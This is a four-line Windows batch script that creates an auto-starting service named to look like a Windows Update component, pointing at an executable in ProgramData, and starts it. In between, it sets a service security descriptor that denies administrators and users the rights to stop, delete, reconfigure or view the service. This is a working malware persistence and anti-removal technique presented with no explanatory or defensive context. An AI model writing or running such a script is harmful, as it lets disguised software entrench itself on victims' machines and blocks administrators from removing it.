@echo off
sc create WinUpdSvc binPath= "C:\ProgramData\wupd\svc.exe" start= auto
sc sdset WinUpdSvc "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)"
sc start WinUpdSvc
